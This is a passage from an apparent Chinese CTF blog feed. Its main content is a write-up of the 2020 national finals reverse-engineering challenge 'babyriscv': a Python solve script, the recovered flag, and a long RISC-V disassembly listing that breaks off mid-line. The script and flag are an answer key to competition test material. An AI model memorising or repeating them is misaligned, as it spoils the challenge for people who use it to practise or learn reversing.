v16;<br>&#125;<br></code></pre></td></tr></table></figure><p>配合源码看起来容易学<br>vector a的第一个字段是size 大小第二个字段是capacity 容量<br>和<code>std::string</code>差不多<br>当<code>size&gt;capacity</code>也就是空间不够用时<br>首先配置一块新空间，然后将元素从旧空间一一搬往新空间，再把旧空间归还给操作系统</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020国赛总决赛re</title>
    <link href="/2020/10/03/2020%E5%9B%BD%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9Bre/"/>
    <url>/2020/10/03/2020%E5%9B%BD%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9Bre/</url>
    
    <content type="html"><![CDATA[<p>多亏易霖博，国赛总决赛都能给整成解题了。之前就喷过ylb平台垃圾运维态度整的和你欠他钱一样，好了这次国赛又来了。俩个re原题大赛</p><a id="more"></a><h1 id="babyriscv"><a href="#babyriscv" class="headerlink" title="babyriscv"></a>babyriscv</h1><p><a href="http://217.logdown.com/posts/235490-isg2014-bt">http://217.logdown.com/posts/235490-isg2014-bt</a></p><p>易霖博可能从哪嫖到了源码，本来是arm的硬是整成了riscv架构</p><p>脚本复制粘贴改下数据出flag</p><p>没错这就是国赛</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&#x27;BpmvcuriVayeQLIKJ  f  U2  l  od  Z  hx  5  _T  s  t&#123;  k  7F  n  Ej  X  C&#125;  O  AN  w  D8  Y  bq  9  gP  W  63  G  MR  4  Sz  H  &#x27;</span><br>i = <span class="hljs-number">0</span><br>tb = &#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dfs</span>(<span class="hljs-params">x,y</span>):</span><br>  <span class="hljs-keyword">global</span> i,tb<br>  <span class="hljs-keyword">if</span> i&lt;<span class="hljs-built_in">len</span>(s):<br>    z = s[i]<br>    i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> z!=<span class="hljs-string">&#x27; &#x27;</span>:<br>      tb[y] = z<br>      dfs(x+<span class="hljs-number">1</span>,<span class="hljs-number">48</span>*(x+<span class="hljs-number">1</span>)+y)<br>      dfs(x+<span class="hljs-number">1</span>,<span class="hljs-number">49</span>*(x+<span class="hljs-number">1</span>)+y)<br><br>dfs(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>v = [<span class="hljs-number">6544</span>, <span class="hljs-number">6559</span>, <span class="hljs-number">2160</span>, <span class="hljs-number">484</span>, <span class="hljs-number">3755</span>, <span class="hljs-number">484</span>, <span class="hljs-number">2177</span>, <span class="hljs-number">2177</span>, <span class="hljs-number">5774</span>, <span class="hljs-number">3756</span>, <span class="hljs-number">6528</span>, <span class="hljs-number">5054</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5067</span>, <span class="hljs-number">3756</span>, <span class="hljs-number">1008</span>, <span class="hljs-number">3168</span>, <span class="hljs-number">288</span>, <span class="hljs-number">483</span>, <span class="hljs-number">1008</span>, <span class="hljs-number">5067</span>, <span class="hljs-number">3168</span>, <span class="hljs-number">3756</span>, <span class="hljs-number">725</span>, <span class="hljs-number">1351</span>, <span class="hljs-number">725</span>, <span class="hljs-number">2640</span>, <span class="hljs-number">3756</span>, <span class="hljs-number">290</span>, <span class="hljs-number">6559</span>, <span class="hljs-number">4393</span>, <span class="hljs-number">480</span>, <span class="hljs-number">1728</span>, <span class="hljs-number">2168</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;</span>.join(tb[x] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> v)<br><span class="hljs-comment">#flag&#123;gOOd_JoB5_rev3r5e_bAby_RlscV&#125;</span><br></code></pre></td></tr></table></figure><p>实在是妙，下次办比赛再换个架构又是一道新题</p><p>不愧是ylb</p><p>反汇编有现成工具</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">103a8</span>:       fea<span class="hljs-number">42623</span>                sw      x<span class="hljs-number">10</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">103ac</span>:       feb<span class="hljs-number">42423</span>                sw      x<span class="hljs-number">11</span>,-<span class="hljs-number">24</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">103b0</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">103b4</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">103b6</span>:       <span class="hljs-number">6789</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">2</span><br><span class="hljs-attribute">103b8</span>:       <span class="hljs-number">99078793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">1648</span> # <span class="hljs-number">0</span>x<span class="hljs-number">1990</span><br><span class="hljs-attribute">103bc</span>:       <span class="hljs-number">28</span>f<span class="hljs-number">71363</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">103c0</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">103c4</span>:       <span class="hljs-number">0791</span>                    c.addi  x<span class="hljs-number">15</span>,<span class="hljs-number">4</span><br><span class="hljs-attribute">103c6</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">103c8</span>:       <span class="hljs-number">6789</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">2</span><br><span class="hljs-attribute">103ca</span>:       <span class="hljs-number">99</span>f<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">1633</span> # <span class="hljs-number">0</span>x<span class="hljs-number">199</span>f<br><span class="hljs-attribute">103ce</span>:       <span class="hljs-number">26</span>f<span class="hljs-number">71</span>a<span class="hljs-number">63</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">103d2</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">103d6</span>:       <span class="hljs-number">07</span>a<span class="hljs-number">1</span>                    c.addi  x<span class="hljs-number">15</span>,<span class="hljs-number">8</span><br><span class="hljs-attribute">103d8</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">103da</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">103dc</span>:       <span class="hljs-number">87078793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">1936</span> # <span class="hljs-number">0</span>x<span class="hljs-number">870</span><br><span class="hljs-attribute">103e0</span>:       <span class="hljs-number">26</span>f<span class="hljs-number">71163</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">103e4</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">103e8</span>:       <span class="hljs-number">07</span>b<span class="hljs-number">1</span>                    c.addi  x<span class="hljs-number">15</span>,<span class="hljs-number">12</span><br><span class="hljs-attribute">103ea</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">103ec</span>:       <span class="hljs-number">1</span>e<span class="hljs-number">400793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">484</span><br><span class="hljs-attribute">103f0</span>:       <span class="hljs-number">24</span>f<span class="hljs-number">71963</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">103f4</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">103f8</span>:       <span class="hljs-number">07</span>c<span class="hljs-number">1</span>                    c.addi  x<span class="hljs-number">15</span>,<span class="hljs-number">16</span><br><span class="hljs-attribute">103fa</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">103fc</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">103fe</span>:       eab<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">341</span> # <span class="hljs-number">0</span>xeab<br><span class="hljs-attribute">10402</span>:       <span class="hljs-number">24</span>f<span class="hljs-number">71063</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">10406</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">1040a</span>:       <span class="hljs-number">07</span>d<span class="hljs-number">1</span>                    c.addi  x<span class="hljs-number">15</span>,<span class="hljs-number">20</span><br><span class="hljs-attribute">1040c</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">1040e</span>:       <span class="hljs-number">1</span>e<span class="hljs-number">400793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">484</span><br><span class="hljs-attribute">10412</span>:       <span class="hljs-number">22</span>f<span class="hljs-number">71863</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">10416</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">1041a</span>:       <span class="hljs-number">07</span>e<span class="hljs-number">1</span>                    c.addi  x<span class="hljs-number">15</span>,<span class="hljs-number">24</span><br><span class="hljs-attribute">1041c</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">1041e</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">10420</span>:       <span class="hljs-number">88178793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">1919</span> # <span class="hljs-number">0</span>x<span class="hljs-number">881</span><br><span class="hljs-attribute">10424</span>:       <span class="hljs-number">20</span>f<span class="hljs-number">71</span>f<span class="hljs-number">63</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">10428</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">1042c</span>:       <span class="hljs-number">07</span>f<span class="hljs-number">1</span>                    c.addi  x<span class="hljs-number">15</span>,<span class="hljs-number">28</span><br><span class="hljs-attribute">1042e</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">10430</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">10432</span>:       <span class="hljs-number">88178793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">1919</span> # <span class="hljs-number">0</span>x<span class="hljs-number">881</span><br><span class="hljs-attribute">10436</span>:       <span class="hljs-number">20</span>f<span class="hljs-number">71663</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">1043a</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">1043e</span>:       <span class="hljs-number">02078793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">32</span><br><span class="hljs-attribute">10442</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">10444</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">10446</span>:       <span class="hljs-number">68</span>e<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">1678</span> # <span class="hljs-number">0</span>x<span class="hljs-number">168</span>e<br><span class="hljs-attribute">1044a</span>:       <span class="hljs-number">1</span>ef<span class="hljs-number">71</span>c<span class="hljs-number">63</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">1044e</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">10452</span>:       <span class="hljs-number">02478793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">36</span><br><span class="hljs-attribute">10456</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">10458</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">1045a</span>:       eac<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">340</span> # <span class="hljs-number">0</span>xeac<br><span class="hljs-attribute">1045e</span>:       <span class="hljs-number">1</span>ef<span class="hljs-number">71263</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">10462</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">10466</span>:       <span class="hljs-number">02878793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">40</span><br><span class="hljs-attribute">1046a</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">1046c</span>:       <span class="hljs-number">6789</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">2</span><br><span class="hljs-attribute">1046e</span>:       <span class="hljs-number">98078793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">1664</span> # <span class="hljs-number">0</span>x<span class="hljs-number">1980</span><br><span class="hljs-attribute">10472</span>:       <span class="hljs-number">1</span>cf<span class="hljs-number">71863</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">10476</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">1047a</span>:       <span class="hljs-number">02</span>c<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">44</span><br><span class="hljs-attribute">1047e</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">10480</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">10482</span>:       <span class="hljs-number">3</span>be<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">958</span> # <span class="hljs-number">0</span>x<span class="hljs-number">13</span>be<br><span class="hljs-attribute">10486</span>:       <span class="hljs-number">1</span>af<span class="hljs-number">71</span>e<span class="hljs-number">63</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">1048a</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">1048e</span>:       <span class="hljs-number">03078793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">48</span><br><span class="hljs-attribute">10492</span>:       <span class="hljs-number">439</span>c                    c.lw    x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">10494</span>:       <span class="hljs-number">1</span>a<span class="hljs-number">079763</span>                bne     x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">10498</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">1049c</span>:       <span class="hljs-number">03478793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">52</span><br><span class="hljs-attribute">104a0</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">104a2</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">104a4</span>:       <span class="hljs-number">3</span>cb<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">971</span> # <span class="hljs-number">0</span>x<span class="hljs-number">13</span>cb<br><span class="hljs-attribute">104a8</span>:       <span class="hljs-number">18</span>f<span class="hljs-number">71</span>d<span class="hljs-number">63</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">104ac</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">104b0</span>:       <span class="hljs-number">03878793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">56</span><br><span class="hljs-attribute">104b4</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">104b6</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">104b8</span>:       eac<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">340</span> # <span class="hljs-number">0</span>xeac<br><span class="hljs-attribute">104bc</span>:       <span class="hljs-number">18</span>f<span class="hljs-number">71363</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">104c0</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">104c4</span>:       <span class="hljs-number">03</span>c<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">60</span><br><span class="hljs-attribute">104c8</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">104ca</span>:       <span class="hljs-number">3</span>f<span class="hljs-number">000793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">1008</span><br><span class="hljs-attribute">104ce</span>:       <span class="hljs-number">16</span>f<span class="hljs-number">71</span>a<span class="hljs-number">63</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">104d2</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">104d6</span>:       <span class="hljs-number">04078793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">64</span><br><span class="hljs-attribute">104da</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">104dc</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">104de</span>:       c<span class="hljs-number">6078793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">928</span> # <span class="hljs-number">0</span>xc<span class="hljs-number">60</span><br><span class="hljs-attribute">104e2</span>:       <span class="hljs-number">16</span>f<span class="hljs-number">71063</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">104e6</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">104ea</span>:       <span class="hljs-number">04478793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">68</span><br><span class="hljs-attribute">104ee</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">104f0</span>:       <span class="hljs-number">12000793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">288</span><br><span class="hljs-attribute">104f4</span>:       <span class="hljs-number">14</span>f<span class="hljs-number">71763</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">104f8</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">104fc</span>:       <span class="hljs-number">04878793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">72</span><br><span class="hljs-attribute">10500</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">10502</span>:       <span class="hljs-number">1</span>e<span class="hljs-number">300793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">483</span><br><span class="hljs-attribute">10506</span>:       